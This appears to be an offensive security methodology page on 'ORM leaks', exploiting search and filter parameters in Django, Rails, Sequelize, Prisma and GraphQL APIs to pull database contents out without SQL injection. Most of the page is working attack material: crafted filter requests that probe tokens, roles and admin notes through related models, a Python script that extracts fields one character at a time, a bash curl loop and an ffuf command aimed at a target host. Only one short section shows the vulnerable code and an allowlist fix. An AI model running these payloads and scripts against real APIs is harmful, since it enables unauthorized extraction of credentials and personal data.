---
tags:
  - high
  - server-side
---

# ORM Leaks

Exploit search/filter functionality built on ORMs to enumerate and exfiltrate database content — without SQL injection.

**Source:** "ORM Leaking More Than You Joined For" — Alex Brown (elttam), PortSwigger Top 10 2025 #2.

---

## TL;DR

As SQLi becomes rare (prepared statements everywhere), ORMs expose their own data extraction surface via **implicit joins** and **filter parameters**. If you can filter or search on any model attribute, you may be able to probe relationships and extract data character-by-character.

```
# Not SQL injection — pure ORM query abuse
GET /api/users?filter[email]=a*           → 200 OK (email starts with 'a')
GET /api/users?filter[email]=b*           → 0 results ('b' doesn't match)
GET /api/users?filter[role]=admin         → admin users exposed
GET /api/users?filter[orders.amount]=1000 → reveals order data via implicit join
```

---

## The Core Concept

ORMs like Django ORM, ActiveRecord, Sequelize, and Prisma support **related field filtering**:

```python
# Developer intends: filter users by name
User.objects.filter(name=request.GET['name'])

# Attacker sends:
?name=admin  # Normal
?name__contains=admin  # Django ORM syntax → works!
?name__startswith=a  # Extracts first character
?email__regex=^a  # Regex-based extraction
```

---

## Exploitation Patterns

### 1. Django ORM — Field Lookups

```bash
# Standard Django filter syntax: field__lookup=value

# Test: does the API pass filter params to ORM directly?
GET /api/users/?name=test
GET /api/users/?name__contains=test  # If this also works → vulnerable

# Character-by-character extraction
GET /api/users/?name__startswith=a  # 200 = name starts with 'a'
GET /api/users/?name__startswith=aa # Check next char...

# Related model traversal (implicit joins)
GET /api/users/?profile__bio__contains=secret
GET /api/users/?orders__amount__gte=1000
GET /api/users/?tokens__value=SECRET_TOKEN
```

**Django ORM lookups to try:**
```
exact, iexact, contains, icontains, startswith, endswith
gt, gte, lt, lte, in, range
regex, iregex
isnull
```

### 2. ActiveRecord (Rails) — Relation Chains

```bash
# Rails passes params to where() without sanitization
GET /api/users?filter[name]=admin
GET /api/users?filter[email][like]=admin%25

# Relation traversal
GET /api/users?filter[posts.title][like]=secret%25
GET /api/users?filter[tokens.value]=KNOWN_TOKEN_TO_VERIFY
```

### 3. Sequelize (Node.js) — Op injection

```bash
# Sequelize operators
GET /api/users?filter[email][$like]=a%25
GET /api/users?filter[email][$startsWith]=admin

# Body-based (JSON API)
POST /api/users/search
{"filter": {"email": {"$like": "a%"}}}
{"filter": {"email": {"$regex": "^a"}}}
```

### 4. Prisma — Where clause abuse

```bash
# Prisma where filter exposure
POST /api/users/query
{"where": {"email": {"startsWith": "admin"}}}
{"where": {"email": {"contains": "@target.com"}}}
{"where": {"OR": [{"email": "victim@email.com"}]}}
```

---

## Data Exfiltration Technique

### Boolean-Based Extraction

```python
# Extract data one character at a time
import requests
import string

def extract_field(base_url, field, target_count=1):
    """Extract field value via boolean ORM leak"""
    known = ""
    charset = string.ascii_lowercase + string.digits + "@.-_"
    
    while True:
        found = False
        for char in charset:
            test = known + char
            # Django ORM example
            r = requests.get(f"{base_url}?{field}__startswith={test}")
            count = r.json().get('count', 0)
            
            if count > 0:
                known = test
                found = True
                print(f"Found: {known}")
                break
        
        if not found:
            break
    
    return known

# Usage
email = extract_field("https://target.com/api/users/", "email")
```

### Count-Based Oracle

```bash
# Different counts reveal data existence
GET /api/users?role=user    → {"count": 10}
GET /api/users?role=admin   → {"count": 3}  # Admins exist!
GET /api/users?role=superadmin → {"count": 1}  # Only one superadmin

# Use count to verify extracted values
GET /api/users?email=admin@target.com → {"count": 1} # Email confirmed!
GET /api/users?email=notexist@x.com → {"count": 0}
```

---

## Hunting ORM Leaks

### Step 1: Find Filter Parameters

```bash
# Look for any filtering/search capability
GET /api/users?search=admin
GET /api/users?filter=name:admin
GET /api/users?q=admin
GET /api/products?category=electronics

# GraphQL (separate attack surface but same concept)
{ users(where: { email: { _like: "a%" } }) { id email } }
```

### Step 2: Test for ORM Syntax Pass-Through

```bash
# Test Django-style lookups
GET /api/users?email=test@test.com   # baseline
GET /api/users?email__exact=test@test.com  # same as above?
GET /api/users?email__contains=test  # broader match?

# Test Rails-style
GET /api/users?user[email]=test@test.com
GET /api/users?filter[email][like]=test%25

# If ORM operators work → leak confirmed
```

### Step 3: Test Cross-Relation Traversal

```bash
# Try to access related model fields
# User → Orders: Does this filter by order amount?
GET /api/users?orders__total__gte=1000

# User → Tokens: Can I find a user by their token?  
GET /api/users?tokens__value=KNOWN_API_KEY

# User → Profile: Access internal fields
GET /api/users?profile__is_staff=true
GET /api/users?profile__admin_notes__contains=secret
```

### Step 4: Enumerate via Boolean Oracle

```bash
# Find all admin emails via startswith oracle
for char in {a..z}; do
  count=$(curl -s "https://target.com/api/users/?role=admin&email__startswith=$char" | jq .count)
  echo "$char: $count"
done
```

---

## Common Vulnerable Patterns

```python
# VULNERABLE: Direct param pass to ORM
def list_users(request):
    filters = request.GET.dict()
    return User.objects.filter(**filters)  # 💀

# VULNERABLE: Missing field allowlist
def search(request):
    field = request.GET.get('field')
    value = request.GET.get('value')
    return Model.objects.filter(**{field: value})  # 💀

# SAFER: Allowlist approach
ALLOWED_FILTERS = {'name', 'status', 'created_at'}
def search(request):
    filters = {k: v for k, v in request.GET.items() if k in ALLOWED_FILTERS}
    return Model.objects.filter(**filters)
```

---

## Impact Assessment

| Finding | Severity |
|---------|----------|
| Can filter on unintended fields | Medium |
| Can traverse related models | High |
| Can extract data character-by-character | High |
| Can confirm existence of sensitive values (tokens, emails) | High |
| Can enumerate all records in a table | Critical |

---

## Checklist

- [ ] Test ORM operator syntax (`field__contains`, `field__startswith`, etc.)
- [ ] Test related model traversal (`related__field=value`)
- [ ] Test with privileged field names (`is_admin`, `role`, `token`)
- [ ] Check if count/pagination data leaks existence information
- [ ] Test JSON body filters (`{"filter": {"field": {"$like": "..."}}}`)
- [ ] Test GraphQL where/filter clauses
- [ ] Verify character-by-character extraction is possible

---

## Tools

```bash
# Custom extraction script
# See Python example above

# Quick test with curl
curl "https://target.com/api/users?email__startswith=admin" | jq .count
curl "https://target.com/api/users?role__in[]=admin&role__in[]=superadmin" | jq .

# Automate with ffuf (for charset discovery)
ffuf -u "https://target.com/api/users?email__startswith=FUZZ" \
  -w /tmp/chars.txt \
  -fr '"count": 0' \
  -mc 200
```

---

*Related: [SQLi Finding](../sqli/find.md) | [IDOR Finding](../idor/find.md) | [API Attacks](api.md)*
